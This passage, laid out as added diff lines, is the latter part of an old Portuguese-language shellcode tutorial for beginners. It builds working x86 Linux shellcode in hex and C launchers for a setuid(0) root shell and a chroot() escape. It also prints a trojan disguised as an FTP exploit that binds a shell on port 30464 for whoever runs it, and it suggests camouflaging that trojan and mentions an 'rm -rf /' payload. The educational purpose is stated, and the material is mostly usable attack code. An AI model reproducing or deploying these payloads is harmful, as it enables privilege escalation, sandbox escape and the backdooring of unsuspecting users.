+movl %esi,0x8(%esi)
+xorl %eax,%eax
+movb %eax,0x7(%esi)
+movl %eax,0xc(%esi)
+movb $0xb,%al
+movl %esi,%ebx
+leal 0x8(%esi),%ecx
+leal 0xc(%esi),%edx
+int $0x80
+xorl %ebx,%ebx
+movl %ebx,%eax
+inc %eax
+int $0x80
+call -0x24
+.string \"/bin/sh\"
+");
+}
+
+
+Depois disso compilamos e executamos o gdb.Lembrando, compile com -static
+e -ggdb, para nao dar erros.
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048150 <main>:       push   %ebp
+0x8048151 <main+1>:     mov    %esp,%ebp
+0x8048153 <main+3>:     xor    %eax,%eax
+0x8048155 <main+5>:     xor    %ebx,%ebx
+0x8048157 <main+7>:     mov    $0x17,%al
+0x8048159 <main+9>:     int    $0x80
+0x804815b <main+11>:    jmp    0x804817c <main+44>
+0x804815d <main+13>:    pop    %esi
+0x804815e <main+14>:    mov    %esi,0x8(%esi)
+0x8048161 <main+17>:    xor    %eax,%eax
+0x8048163 <main+19>:    mov    %al,0x7(%esi)
+0x8048166 <main+22>:    mov    %eax,0xc(%esi)
+0x8048169 <main+25>:    mov    $0xb,%al
+0x804816b <main+27>:    mov    %esi,%ebx
+0x804816d <main+29>:    lea    0x8(%esi),%ecx
+0x8048170 <main+32>:    lea    0xc(%esi),%edx
+0x8048173 <main+35>:    int    $0x80
+0x8048175 <main+37>:    xor    %ebx,%ebx
+0x8048177 <main+39>:    mov    %ebx,%eax
+0x8048179 <main+41>:    inc    %eax
+0x804817a <main+42>:    int    $0x80
+0x804817c <main+44>:    call   0x804815d <main+13>
+0x8048181 <main+49>:    das
+0x8048182 <main+50>:    bound  %ebp,0x6e(%ecx)
+0x8048185 <main+53>:    das
+0x8048186 <main+54>:    jae    0x80481f0 <__new_exitfn+52>
+0x8048188 <main+56>:    add    %cl,0x90c35dec(%ecx)
+End of assembler dump.
+
+Depois vamos na marra pegar a representacao em hexa de todo nosso
+shellcode.
+
+(gdb) x/xb main+3
+0x8048153 <main+3>:     0x31
+(gdb) x/xb main+4
+0x8048154 <main+4>:     0xc0
+(gdb) x/xb main+5
+0x8048155 <main+5>:     0x31
+(gdb) x/xb main+6
+0x8048156 <main+6>:     0xdb
+(gdb) x/xb main+7
+0x8048157 <main+7>:     0xb0
+(gdb)
+.
+.
+.
+(gdb) x/xb main+56
+0x8048188 <main+56>:    0x00
+(gdb) x/xb main+57
+0x8048189 <main+57>:    0x89
+(gdb) x/xb main+58
+0x804818a <main+58>:    0xec
+(gdb) x/xb main+59
+0x804818b <main+59>:    0x5d
+(gdb) x/xb main+60
+0x804818c <main+60>:    0xc3
+(gdb) x/xb main+61
+0x804818d <main+61>:    0x90
+
+Chegamos no tal NOP, aqui paramos.
+Veremos agora como ele fica inserido no codigo C.
+
+/* shellcode setuid(0) em /bin/sh */
+#include <stdio.h>
+#include <stdlib.h>
+
+
+char shellcode[] =
+  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
+  "\x5d\xc3";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno +2;
+(*retorno) = (int)shellcode;
+}
+
+Compile normalmente "gcc -o shellsetuid shellsetuid.c".Depois execute,
+voce verah que ele funcione perfeitamente.Eu coloquei a linha
+correspondente ao codigo que acrescentamos na primeira linha, para
+voce visualizar melhor.Voce pode perceber que as instrucoes e seus
+referentes codigos em hexa depois de "\xcd\x80" (int $0x80) na primeira
+linha ateh o fim sao identicas ao nosso shellcode inicial.Isso mesmo
+amigo, voce pode sim somente trabalhar em cima do codigo que quer
+acrescentar, sem a necessidade de ficar perdendo tempo, principalmente
+quando quer passar para a representacao dele em hexa, coloquei o esquema
+acima para que voce vah logo se acostumando, e tambem para que nao haja
+duvida quanto as instrucoes em representacao hexadecimal.Esse shellcode
+pode ser usado em programas vulneraveis a buffer overflows, mas que
+quando exploitados o fazem cair na sua propria shell, colocando
+setuid(0), voce cairah numa root shell.
+
+
+7.4 - QUEBRANDO CHROOT()
+-------------------------
+
+Bem, para quem nao sabe o que eh chroot(), aqui vai uma breve explicacao.
+chroot() eh uma funcao usada comumente para nao permitir acesso de um
+usuario a outros diretorios, chroot() seta um diretorio para ser o
+diretorio raiz do usuario, nao permitindo que ele tenha acesso a outros
+diretorios "antes" daquele setado.Um exemplo pratico disso, nos vemos
+quase sempre quando entramos num servidor de ftp como usuario anonymous,
+nos caimos geralmente dentro do diretorio raiz "/", mas na verdade
+devemos estar no diretorio "/home/ftp" do servidor em questao.Entao
+amigos, o que foi feito foi ter setado o diretorio "/home/ftp",
+atraves da funcao chroot() para fazer com que este diretorio seja
+o diretorio raiz "/" para um determinado usuario, no nosso caso,
+anonymous.Mas isso eh bastante comun, vemos isso em servidores de
+home pages gratuitas, servidore de ftp com acesso via conta, enfim,
+diversos sao os casos.Soh que mais uma vez, o pessoal agiu, descobriram
+que atraves de um buffer overflow, ou mesmo pela execucao de um shellcode
+como root(atravez de um programa suid),que era possivel inserir codigo
+malioso que quebrasse essa protecao.Isso vem sendo durante muito tempo
+usado, principalmente em "remote buffer overflows" em servidores de ftp.
+O que vai ser explicado aqui nao eh como se faz overflows para se quebrar
+isso, mas sim, uma forma de executar um codigo como root que "quebre"
+esta defesa.
+
+Veremos um esquema para se "quebrar" isso, mas eu conheco outro esquema
+ainda, veja depois o item 7.4.
+
+
+/* Primeiro tipo de shellcode para quebrar chroot() */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main()
+{
+        mkdir("sh",0755);
+        chroot("sh");
+
+        /* Colocamos muitos  "../", voce pode ver a funcionalidade
+           deles executando em sua shell, verah que cairah no
+           diretorio raiz, lembrando: "Tem muito servidor de http
+           por aih que permitem atraves disso  que se leia um
+           arquivo do sistema! */
+
+        chroot("../../../../../../../../../../../../../../../../");
+}
+
+Compilamos com as opcoes para gerar codigo estatico, em seguida
+carregamos o programa no debugador gdb.
+
+[localhost:/]$ gcc -o shechroot1 shechroot1.c -static -ggdb
+[localhost:/]$ gdb shechroot1
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.This GDB was configured as "i686-pc-linux-gnulibc1"...
+(gdb)
+
+Se voce digitar "disassemble main" verah a chamada para as 3 funcoes
+ou system calls responsaveis pela quebra, nao colocarei aqui, mas
+de uma olhada para que nao haja duvidas.
+
+Seguimos abaixo desassemblando o codigo de mkdir.
+
+(gdb) disassemble mkdir
+Dump of assembler code for function mkdir:
+0x8048404 <mkdir>:      push   %ebp
+0x8048405 <mkdir+1>:    mov    %esp,%ebp
+0x8048407 <mkdir+3>:    push   %ebx
+0x8048408 <mkdir+4>:    mov    $0x27,%eax
+0x804840d <mkdir+9>:    mov    0x8(%ebp),%ebx
+0x8048410 <mkdir+12>:   mov    0xc(%ebp),%ecx
+0x8048413 <mkdir+15>:   int    $0x80
+0x8048415 <mkdir+17>:   mov    %eax,%edx
+0x8048417 <mkdir+19>:   test   %edx,%edx
+0x8048419 <mkdir+21>:   jge    0x804842b <mkdir+39>
+0x804841b <mkdir+23>:   neg    %edx
+0x804841d <mkdir+25>:   push   %edx
+0x804841e <mkdir+26>:   call   0x8050b58 <__normal_errno_location>
+0x8048423 <mkdir+31>:   pop    %edx
+0x8048424 <mkdir+32>:   mov    %edx,(%eax)
+0x8048426 <mkdir+34>:   mov    $0xffffffff,%eax
+0x804842b <mkdir+39>:   pop    %ebx
+0x804842c <mkdir+40>:   mov    %ebp,%esp
+0x804842e <mkdir+42>:   pop    %ebp
+0x804842f <mkdir+43>:   ret
+End of assembler dump.
+(gdb)
+
+Para mkdir, tudo que nos importa sao as primeiras 7 linhas.Dessas 7
+linhas, como as 3 primeiras correspondem ao procedimento inicial ou
+preludio, somente as 4 restantes de fato irao nos interessar, eis
+elas aih embaixo:
+
+0x8048408 <mkdir+4>:    mov    $0x27,%eax
+0x804840d <mkdir+9>:    mov    0x8(%ebp),%ebx
+0x8048410 <mkdir+12>:   mov    0xc(%ebp),%ecx
+0x8048413 <mkdir+15>:   int    $0x80
+
+O codigo acima faz o seguinte:
+mov $0x27,%eax
+
+Coloca o numero correspondente a mkdir na tabela system call(39) em %eax.
+
+mov    0x8(%ebp),%ebx
+
+Coloca o endereco da string "sh" em %ebx.
+
+mov    0xc(%ebp),%ecx
+
+Coloca o endereco a string "0755" em %ecx.
+
+
+Para o codigo acima, retiramos os null bytes e teremos:
+
+xorl %eax,%eax
+xorl %ecx,%ecx
+movb $0x27,%al
+leal 0x5(%esi),%ebx
+
+Essa instrucao lea aih estah para executar o seguinte:
+"%esi" possui referencia a "/bin/sh"  antes de usar esta intrucao, no
+caso, esse /bin/sh, eh aquele no nosso primeiro shellcode inicial, onde
+esse codigo para quebrar chroot() vai ser inserido.Esta instrucao(leal)
+carrega o endereco de "sh", nao de "/bin/sh", e armazena em %ebx.
+
+incb %ch
+movb $0xed,%cl
+int $0x80
+
+Em cima aih, complica um pouco.O que estah acontecendo eh o seguinte,
+lembrando que CH  eh o registrador counter high, contador de memoria
+alta.CX, eh CH + CL, (HIGH e LOW), respectivamente.Inicialmente temos:
+
+CX = 0000 0001 0000 0000
+
+
+Incrementando %ch (incb %ch), mudaremos todo %cx, como explicado no
+capitulo sobre registradores. Entao, agora teremos:
+
+CX = 0000 0001 1110 1101
+
+Pegando soh uma parte dele e movendo sobre cl (Contador Baixo), teremos:
+
+CX = 000 111 101 101
+
+Preste bem atencao, olhe para o CX acima que foi incrementado, veja que
+nos pegamos as tres ultimas partes(0001 1110 1101) e dividimos em quatro
+partes de 3(000 111 101 101), foi por isso que fiz questao de ensinar
+a conversao usando notacoes,amigo. Se voce prestar atencao, pegarah os
+respectivos numeros decimais de cada numero binario aih soh olhando:
+
+                000 111 101 101
+                 0   7   5   5
+
+Que eh exatamente nosso codigo referido a permissao do diretorio "sh"
+que estarah sendo criado.Nao se assuste com tudo isso, amigo, foi soh
+para ilustrar, para nossos intuitos, o codigo em C faz quase todo o
+trabalho.
+
+Vejamos entao como ficarah o codigo para mkdir():
+
+xorl %eax,%eax
+xorl %ecx,%ecx
+movb $0x27,%al
+leal 0x5(%esi),%ebx
+incb %ch
+movb $0xed,%cl
+int $0x80
+
+Eis aih nosso codigo.mkdir() estah exterminado, agora vejamos para
+chroot().Voltemos novamente ao gdb.
+
+(gdb) disassemble chroot
+Dump of assembler code for function chroot:
+0x8048430 <chroot>:     push   %ebp
+0x8048431 <chroot+1>:   mov    %esp,%ebp
+0x8048433 <chroot+3>:   push   %ebx
+0x8048434 <chroot+4>:   mov    $0x3d,%eax
+0x8048439 <chroot+9>:   mov    0x8(%ebp),%ebx
+0x804843c <chroot+12>:  int    $0x80
+0x804843e <chroot+14>:  mov    %eax,%edx
+0x8048440 <chroot+16>:  test   %edx,%edx
+0x8048442 <chroot+18>:  jge    0x8048454 <chroot+36>
+0x8048444 <chroot+20>:  neg    %edx
+0x8048446 <chroot+22>:  push   %edx
+0x8048447 <chroot+23>:  call   0x8050b58 <__normal_errno_location>
+0x804844c <chroot+28>:  pop    %edx
+0x804844d <chroot+29>:  mov    %edx,(%eax)
+0x804844f <chroot+31>:  mov    $0xffffffff,%eax
+0x8048454 <chroot+36>:  pop    %ebx
+0x8048455 <chroot+37>:  mov    %ebp,%esp
+0x8048457 <chroot+39>:  pop    %ebp
+0x8048458 <chroot+40>:  ret
+0x8048459 <chroot+41>:  nop
+0x804845a <chroot+42>:  nop
+0x804845b <chroot+43>:  nop
+End of assembler dump.
+
+
+De todo este codigo aih, voce jah deve ter percebido, o que vai nos
+interessar eh somente as linhas:
+
+0x8048434 <chroot+4>:   mov    $0x3d,%eax
+0x8048439 <chroot+9>:   mov    0x8(%ebp),%ebx
+0x804843c <chroot+12>:  int    $0x80
+
+Vejamos em detalhes:
+
+mov    $0x3d,%eax
+
+Coloca o numero correspondente ao system call chroot(61) em %eax.
+
+mov    0x8(%ebp),%ebx
+
+Coloca o endereco de "sh" em %ebx.
+
+int    $0x80
+
+Sai para o modo kernel.
+
+Retirando os byte nulos, teremos:
+
+xorl %eax,%eax
+leal 0x5(%esi),%ebx
+movb $0x3d,%al
+int $0x80
+
+Para esse codigo nao tem muito segredo, mas agora entrarah um pouquinho
+da necessidade de se saber trabalhar e escrever em assembly.O chroot()
+em nosso exemplo, possui duas chamadas, podemos ver isso desassemblando
+main, a primeira chamada se refere ao que descrevemos acima, chroot("sh"),
+a segunda eh a que vou tentar explicar abaixo:
+
+chroot("../../../../../../../../../../../../../../../../");
+
+O codigo para isto, segue abaixo:
+
+movl $0xffd0d1d2,%ebx
+negl %ebx
+xorl %ecx,%ecx
+movb $0x10,%cl
+pushl %esi
+addl %ecx,%esi
+movl %ebx,(%esi)
+addl $0x3,%esi
+loopne -0x7
+popl %esi
+movb $0x3d,%al
+leal 0x10(%esi),%ebx
+int $0x80
+
+Vamos com bastante calma, vou explicar o que significa isso aih:
+
+movl $0xffd0d1d2,%ebx
+
+Pega o endereco de "../" e guarda em %ebx.
+
+negl %ebx
+
+Eh uma instrucao logica, indicando que %ebx nao eh maior ou igual a
+string armazenada(aquele monte de ../).
+
+xorl %ecx,%ecx
+movb $0x10,%cl
+
+Um contador nao nulo, preparado p/ contar ateh 16(16 vezes ../).
+
+pushl %esi
+addl %ecx,%esi
+movl %ebx,(%esi)
+addl $0x3,%esi
+
+Nada demais aih em cima, onde tah sendo adicionado ao source index os
+16 ../ .
+
+loopne -0x7
+popl %esi
+
+O loop para geracao logica. Voce tah vendo aih um numero negativo -0x7,
+o loopne salta se o registrador CX, no caso %ecx for diferente de -0x7.
+
+movb    $0x3d,%al
+
+Coloca o numero correspondente ao system call chroot(61) em %al.
+
+leal 0x10(%esi),%ebx
+
+Aqui sim ocorre a "copia" 16 vezes propriamente dita de "../".
+
+int $0x80
+
+Volta para o modo kernel.
+
+Como voce pode ver, nao eh nada facil fazer shellcodes um pouco mais
+complexos.Isso foi soh para voce ter uma breve ideia, logico, dependendo
+do seu nivel de conhecimentos em assembly, isso tudo pode parecer
+fichinha.Como quero descrever soh o basico, ateh mesmo este exemplo foge
+ao escopo deste tutorial, mas foi soh para voce se empolgar mais!!
+
+Vejamos agora como fica isso aih num programa C.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+char shellcode[]=
+        "\xeb\x4f"                      /* jmp 0x4f              */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x31\xc9"                      /* xorl %ecx,%ecx        */
+        "\x5e"                          /* popl %esi             */
+        "\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+        "\xb0\x27"                      /* movb $0x27,%al        */
+        "\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+        "\xfe\xc5"                      /* incb %ch              */
+        "\xb1\xed"                      /* movb $0xed,%cl        */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
+        "\xb0\x3d"                      /* movb $0x3d,%al        */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
+        "\xf7\xdb"                      /* negl %ebx             */
+        "\x31\xc9"                      /* xorl %ecx,%ecx        */
+        "\xb1\x10"                      /* movb $0x10,%cl        */
+        "\x56"                          /* pushl %esi            */
+        "\x01\xce"                      /* addl %ecx,%esi        */
+        "\x89\x1e"                      /* movl %ebx,(%esi)      */
+        "\x83\xc6\x03"                  /* addl %0x3,%esi        */
+        "\xe0\xf9"                      /* loopne -0x7           */
+        "\x5e"                          /* popl %esi             */
+        "\xb0\x3d"                      /* movb $0x3d,%al        */
+        "\x8d\x5e\x10"                  /* leal 0x10(%esi),%ebx  */
+        "\xcd\x80"                      /* int $0x80             */
+        "\x31\xc0"                      /* xorl %eax,%eax        */
+        "\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+        "\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+        "\xb0\x0b"                      /* movb $0xb,%al         */
+        "\x89\xf3"                      /* movl %esi,%ebx        */
+        "\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+        "\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+        "\xcd\x80"                      /* int $0x80             */
+        "\xe8\xac\xff\xff\xff"          /* call -0x54            */
+        "/bin/sh";                      /* .string \"/bin/sh\"   */
+
+void main(){
+int *retorno;
+retorno = (int *)&retorno +2;
+  (*retorno) = (int)shellcode;
+
+}
+
+Voce pode testa-lo em sua maquina, mas ele eh util, mais para o pessoa
+que tentarah executar algum comando malicioso como root.De qualquer
+forma, ele eh bastante util para propositos educacionais!!:)
+
+
+7.4 Dividas Para o Proximo Tutorial
+------------------------------------
+
+Eu vou ficar devendo algumas coisas que jah estao preparadas amigo,
+mas como voce pode ver, este assunto nunca estah completo, tem mais
+de 2000 linhas de texto aqui, e isso eh apenas o basico, queria colocar
+mais coisas, mas vai ficar para o proximo, ou mesmo para um mais
+avancado, nao sei se feito por mim ou algum outro membro do grupo, quem
+sabe ateh outros grupos nao se antecipam, nao sei, mas espere um pouco.
+De ante-mao, digo algumas coisas, eh possivel se fazer muitos shellcodes,
+o que se faz necessario eh um maior aprendizado de assembly, e como
+sempre, bons algoritmos ajuda.Eu dei algumas dicas de shellcodes que
+podem ser feitos facilmente amigo, nao investi em truques, pode-se usar
+truques que facilitam as coisas, mas tem que saber o que se estah
+fazendo, como aqui eh voltado para NewBie, nao direi truques ainda.
+
+Gostaria de deixar um aviso do porque da necessidade de se conhecer
+ao menos o basico sobre isso, em essencial sobre assembly.Essas linhas
+eu direciono para os kiddies, que pegam todo e qualquer exploit e jah
+vai logo compilando e executando, em busca da primeira rede bugada que
+encontrar, gente que anda em canais querendo trocar shell, como se o
+pessoal que manja mesmo estivesse interessado nisso, se liga mano,
+o pessoal que manja, primeiro nao sai por aih dizendo que invadiu isso
+ou aquilo, ou mesmo chega ao ponto de trocar shells, existem muitos
+motivos para eles fazerem isso, coisas que kiddies nao entenderiam.
+Mas de qualquer forma, amigo Newbie, veja um exemplo de um trojan horse
+inserido num shellcode abaixo.
+
+------------------------ trojanshell1.c ------------------------------
+/* Exemplo de um trojan horse que abre uma porta(30464) com
+   shell do usuario que o executou.
+   Desenvolvido por Nash Leon com base no Shellcode
+   do Taeho Oh ( ohhara@postech.edu ).
+   Agradecimentos a Magic Kiss e ao Unsekurity Team.
+   nashleon@yahoo.com.br
+*/
+
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+char shellcode[]=
+"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
+"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
+"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
+"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
+"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
+"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
+"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
+"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
+"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
+"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
+"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
+"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";
+
+void trojan();
+main(int argc, char *argv[]){
+char *vitima;
+int Meusocket;
+struct hostent *he;
+struct sockaddr_in lascado;
+if(argc < 2){
+printf("Uso: %s <host_bugado>\n",argv[0]);
+exit(0);
+}
+
+vitima = argv[1];
+
+
+he = gethostbyname(vitima);
+if (he < 0){
+printf("Host Desconhecido mano!!\n");
+exit(1);
+}
+Meusocket = socket(AF_INET, SOCK_STREAM, 0);
+if(Meusocket < 0){
+fprintf(stderr,"Erro no socket mano!!\n");
+exit(1);
+}
+lascado.sin_family = he->h_addrtype;
+lascado.sin_port = htons(21);
+lascado.sin_addr = *((struct in_addr *)he->h_addr);
+bzero(&(lascado.sin_zero), 8);
+if(connect(Meusocket,(struct sockaddr * )&lascado, sizeof(lascado)) ==0){
+printf("Erro em connect() mano!!\n");
+close(Meusocket);
+trojan();
+}
+else {
+printf("Falha no overflow mano!!\n");
+close(Meusocket);
+}
+void trojan(){
+int *retorno;
+retorno = (int *)&retorno +2;
+  (*retorno) = (int)shellcode;
+
+}
+-----------------------------------------------------------------
+
+Eh obvio e evidente que este trojan pode ser melhorado, mas coloquei
+ele simples assim, soh para dar uma ideia do perigo que eh voce
+executar exploits dos outros sem ter conhecimento de no minimo o que
+estarah sendo executado no programa.Qualquer um com poucos conhecimentos
+em C veria que as ultimas linhas sao suspeitas, mas e quanto ao shellcode,
+que vem parecido em muitos exploits??? Os kiddies executam algo sem nem
+mesmo ter ideia do perigo.O trojan acima abre a porta 30464, que jah eh
+amplamente difundida nesse exemplo de shellcode na internet, mas ela
+pode facilmente ser alterada, e entre as dividas que deixarei, eh
+explicar passo por passo, a escrita e funcionamento deste shellcode.
+Se voce tem alguma vitima, voce terah que adaptar esse exploit, mas
+fica aih o conceito, voce poderia muito bem alterar o conteudo,
+camuflar a funcao trojan, ou mesmo inserir o codigo dentro de main,
+existem dezenas de formas de se melhorar isso aih em cima, coloquei
+simples porque nao quero ser responsavel por nada!!Escrevi esse
+trojan apenas com proposito educacional!!Nao me responsabilizo por
+eventuais danos que alguem pode gerar com o uso dele!!!
+Outra ilustracao do perigo que os kiddies passam quando executam
+exploits dos outros, eh executar exploits como root.Alguem poderia
+muito bem fazer um trojan igual a este, mas ao inves de abrir uma porta
+com shell, executaria um comando como por exemplo: " rm -rf /". Isso eh
+um aviso para aquele pessoal que pensa que entrar para esse mundo
+underground eh brincadeira!!!
+
+Pretendo em tutoriais futuros disponibilizar shellcodes quase tao
+perigosos quanto este, vai depender de alguns fatores.Voce jah deve
+estar contemplando muitas teorias amigo..:)...Mande brasa.
+
+Tou devendo a solucao de muitas coisas que ficaram pendentes aqui,
+como executar comandos de tamanho maior de /bin/ls ou /bin/sh.
+Tambem tou devendo uma maior insercao em shellcodes contra filtros.
+Um shellcode para acrescentar usuario ou usuarios num passwd.Muita
+coisa boa, em breve, estarah disponivel para voce amigo.Fique
+atento a home page do grupo Unsekurity Team, estaremos sempre
+disponibilizando tutoriais e textos diversos de nivel, voltado
+mais a galera que de fato quer aprender.
+
+Espero que os exemplos tenham ficado claros, e que sirvam de algum
+modo a voce nessa longa jornada que estamos fazendo.
+
+
+----------------
+8 - TERMINANDO  |
+----------------
+
+Ultimo capitulo dessa nossa fase inicial de escrita de shellcodes,
+nada mais que uma breve despedida.
+
+
+
+8.1 DIFERENCAS ENTRE A SINTAXE AT&T E A SINTAXE INTEL
+-------------------------------------------------------
+
+* Os nomes dos registradores sao precedidos por "%" , alguns exemplos sao:
+%eax, %ebx, %ecx, %edx, %esi, %edi e %ebp, que correspondem a ax,bx,cx,dx
+si,di e bp na sintaxe INTEL.
+
+* Na sintaxe INTEL, primeiro vem o destino, depois a fonte(source) ou
+origem.Exemplo: mov ah,002. Na sintaxe AT&T eh o inverso primeiro vem a
+fonte ou origem(source), e no fim o destino, exemplo: movl $2, %eax
+
+* Operandos imediatos sao marcados com um prefixo $, como em addl $3,%eax
+  (adiciona valor 3 p/ registrador %eax).
+
+* O tamanho do operando eh especificado com um sufixo do tipo da instrucao.
+  O sufixo eh b para byte(8 bits), w para word(16 bits), e l para long(32
+  bits).Exemplo: movw %dx,%ax. Todavia, em muitos sistemas, na sintaxe
+  AT&T, o uso desses sufixos sao opcionais, onde por padrao eh long, ou
+  32 bits.
+
+* A falta de prefixo p/ um operando indica que ele eh um endereco de
+  memoria. Como vimos movl $foo,%eax coloca o endereco da variavel
+  foo no registrador %eax, mas movl foo,%eax coloca o conteudo da variavel
+  foo no registrador %eax.
+
+
+8.2 - Links e Referencias
+---------------------------
+
+Sao varias as referencias usadas para a escrita deste tutorial, algumas
+compilacoes minhas aqui mesma, foram usadas, coisas bem antigas,de
+qualquer forma, as referencias abaixo podem e devem ser uteis para um
+Newbie.
+
+"Smash The Stack For Fun e Profit" - PHRACK 49-14, by Aleph 0ne.
+ Pode ser obtido em : www.phrack.com
+                      www.2600.com/phrack/
+
+
+"Advanced Buffer Overflows" - Taeho Oh.
+Pode ser obtido em: http://postech.edu/~ohhara
+                    www.securityfocus.com
+                    http://packetstorm.securify.com
+
+"Curso de assembly" - Frederico Pissarra.
+Pode ser obtido em: www.assembly.8m.com
+
+"Turbo C Avancado" - Herbet Schildt. Editora: McGraW-Hill
+
+Alguns links onde voce pode obter mais informacoes sobre assembly:
+
+www.assembly.8m.com
+www.ice-digga.com/programmig/bmp.html
+www.strangecreations.com/library/assembly/tutor
+www.nuvisionmiami.com/kip/asm.htm
+
+
+8.3 - Consideracoes Finais
+---------------------------
+
+Bem amigo, aqui eh soh bobagem, se nao tiver disposto, pode fechar o
+editor de texto ou o browser, ou qualquer programa que esteja usando
+para ler isso, bem como o caderno ou folhas de papel.
+Escrever tutoriais voltados para Newbie eh ao mesmo tempo gratificante
+e dificil.Gratificante porque dah a sensacao de estarmos empurrando
+uma gigantesca roda de informacoes, num constante ciclo em busca de
+maior liberdade de informacao, bem como de troca de informacoes.Sao poucos
+os textos sobre escrita de shellcodes em portugues, nao quero com isso
+desmerecer os que os fizeram, ao contrario, sou grato sim a esse pessoal
+que de fato contribui ou contribuiu durante algum tempo para que esta
+roda continuasse girando.Mais uma vez direciono umas palavras a "elite"
+de fucadores nacional, ateh quando??? Vemos muitos garotos fazendo
+bobagens como mudar home pages e etc, mas de quem eh a culpa?? Se
+existem culpados, nao quero acusar o pessoal da seguranca, pois o
+pessoal da seguranca tem se mostrado fraco porque ateh hoje soh se
+depararam com garotos que no maximo derrubam um provedor ou mudam uma
+home page, mas todos nos sabemos que por tras das cameras tem crackers
+capazes de fazer o que quiserem com sistemas que valem milhoes, tendo
+acesso a todo tipo de informacao, desde cartoes de creditos, ateh mesmo
+projetos que podem valer milhoes ou mesmo destruir milhoes.Nao gosto de
+crackers, e nao eh para eles que escrevo, sei que aqui no pais, existem
+pessoas com decadas, isso mesmo, muitos anos de hacking, mas que se
+encontram quietos.Cada um possui o direito de agir e pensar da forma que
+quiser, mas quando os kiddies mudam uma home page e a midia cai em cima,
+chamando-os de "hackers", creio que, de uma forma ou de outra, esses que
+se encontram quietos tambem sao culpados por tal situacao.Isso tudo jah
+aconteceu lah fora, tah acontecendo aqui, os mais espertos sabem no que
+isso vai dar e jah estao se precavendo.Depois de muitos anos resolvi
+aparecer no cenario porque de fato temo que hackers que verdade paguem
+o preco pelo que os kiddies e crackers(sabemos que existem e ateh quem
+sao) andam fazendo.Nao se apavorem quando pintar uma operacao nos moldes
+da Sun Devil aqui no pais, porque temos ateh entao sido cumplices do
+jogo que a "seguranca" tem tramado.
+
+Manifesto a parte, gostaria de agradecer ao pessoal que tornou possivel
+este tutorial, sao tantas pessoas, mas se esqueci de alguem, espero
+a compreensao do mesmo, o tempo continua a ser meu inimigo.
+
+Thanks Magic Kiss, module, raynox, xf86config, psych, e-brain, cs0,
+       t[rex], Blind_Bard, Dinamite_, d3m3ns, CeZiNHa, meu grande amigo
+       zip, thunderoffire, ocorvo, arse, kaervek, cdma, Matt_Salermo,
+       Thanath0s e aos demais grupos que contribuem mundialmente
+       para que haja maior liberdade de informacao.
+
+
+Fiquem atentos a home page do Unsekurity Team, novos materias devem
+estar disponiveis por estes dias.Sem mais.
+
+                                       Nash Leon vulgo coracaodeleao.
+
+
+------------------------------ EOF -------------------------------------
+        
+                        
+
